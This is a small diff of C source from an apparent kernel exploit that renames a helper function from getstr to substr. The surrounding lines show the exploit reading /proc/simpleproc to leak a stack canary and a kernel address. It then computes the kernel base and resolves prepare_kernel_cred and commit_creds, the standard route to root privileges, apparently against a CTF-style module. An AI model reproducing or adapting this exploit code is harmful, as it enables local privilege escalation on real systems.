@@ -114,7 +114,7 @@ char *p64(ul data)
 }
 
 /* extract substring */
-char *getstr(char *buf, int start, int end)
+char *substr(char *buf, int start, int end)
 {
     int i = 0;
     int index = 0;
@@ -155,8 +155,8 @@ int main(int argc, const char *argv[])
     /* leak stack canary & kernel address */
     int rfd = open("/proc/simpleproc", O_RDONLY);
     read(rfd, in, 300);
-    ul canary = u64(getstr(in, 100, 108));
-    ul kaddr = u64(getstr(in, 148, 156));
+    ul canary = u64(substr(in, 100, 108));
+    ul kaddr = u64(substr(in, 148, 156));
     ul kbase = kaddr - 0x2cc2e2;
     prepare_kernel_cred = kbase + 0xaa6b0;
     commit_creds = kbase + 0xaa2e0;
